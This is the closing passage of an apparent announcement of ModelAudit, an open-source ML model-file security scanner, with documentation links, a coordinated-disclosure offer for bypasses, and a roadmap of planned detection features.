- [Scanner reference](/docs/model-audit/scanners/)
- [CI/CD integration guide](/docs/model-audit/ci-cd)
- [Advanced usage](/docs/model-audit/usage)
- [Contribution guide](https://github.com/promptfoo/modelaudit/blob/main/CONTRIBUTING.md)

If you find a bypass, we follow coordinated disclosure and will credit you.

If you want a hosted UI and managed integrations, Promptfoo also offers ModelAudit in the [platform](https://www.promptfoo.dev/model-security/). The engine is the same open-source code.

## What's next

- **Expanding CVE coverage** for TensorFlow, Keras, and ONNX vulnerabilities
- **Published benchmarks** for scan speed, memory usage, and false positive rates
- **Weight-level backdoor detection** — extending beyond serialization to detect backdoors hidden in tensor weight values
- **Publishing the POC test suite** for other scanner maintainers to test against

Contributions are welcome. [Open issues](https://github.com/promptfoo/modelaudit/issues) on GitHub or reach out directly.
